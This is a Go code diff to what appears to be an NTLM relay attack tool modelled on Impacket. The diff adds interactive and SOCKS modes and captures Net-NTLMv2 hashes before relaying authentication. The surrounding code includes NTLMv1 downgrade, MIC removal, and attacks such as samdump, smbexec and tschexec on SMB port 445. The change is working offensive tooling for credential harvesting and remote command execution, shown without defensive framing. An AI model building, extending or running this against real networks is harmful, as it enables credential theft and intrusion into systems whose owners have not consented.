@@ -24,7 +24,7 @@ func Run(cfg *Config) error {
 	if cfg.ListenAddr == "" {
 		cfg.ListenAddr = ":445"
 	}
-	if cfg.Attack == "" {
+	if cfg.Attack == "" && !cfg.Interactive && !cfg.SOCKSEnabled {
 		// Auto-select attack based on target and flags (matches Impacket UX)
 		if target.Scheme == "smb" {
 			cfg.Attack = "samdump"
@@ -66,9 +66,15 @@ func Run(cfg *Config) error {
 	} else {
 		log.Printf("[*] Target: %s", target.URL())
 	}
-	log.Printf("[*] Attack: %s", cfg.Attack)
-	if (cfg.Attack == "smbexec" || cfg.Attack == "tschexec" || cfg.Attack == "rpctschexec") && cfg.Command != "" {
-		log.Printf("[*] Command: %s", cfg.Command)
+	if cfg.Interactive {
+		log.Printf("[*] Mode: interactive")
+	} else if cfg.SOCKSEnabled {
+		log.Printf("[*] Mode: SOCKS")
+	} else {
+		log.Printf("[*] Attack: %s", cfg.Attack)
+		if (cfg.Attack == "smbexec" || cfg.Attack == "tschexec" || cfg.Attack == "rpctschexec") && cfg.Command != "" {
+			log.Printf("[*] Command: %s", cfg.Command)
+		}
 	}
 
 	// Start SOCKS5 proxy if enabled
@@ -311,6 +317,9 @@ func handleAuth(auth AuthResult, cfg *Config) {
 		return
 	}
 
+	// Keep original Type 2 for hash extraction (before NTLMv1 downgrade modifies it)
+	origType2 := type2
+
 	// Apply NTLMv1 downgrade to Type2 if configured
 	if cfg.NTLMv1 {
 		type2 = downgradeToNTLMv1(type2)
@@ -331,13 +340,19 @@ func handleAuth(auth AuthResult, cfg *Config) {
 		return
 	}
 
+	// Extract and log Net-NTLMv2 hash (before any manipulation, and before relay attempt
+	// so the hash is captured even if relay fails — matches Impacket behavior)
+	domain, user := extractNTLMType3Info(type3)
+	if hash := extractNetNTLMv2Hash(origType2, type3, domain, user); hash != "" {
+		logCapturedHash(hash, cfg.OutputFile)
+	}
+
 	// Apply NTLM manipulation to Type 3
 	if cfg.RemoveMIC {
 		type3 = removeMIC(type3)
 	}
 
 	// Relay Type 3 to target
-	domain, user := extractNTLMType3Info(type3)
 	identity := fmt.Sprintf("%s\\%s", domain, user)
 
 	if err := client.SendAuth(type3); err != nil {
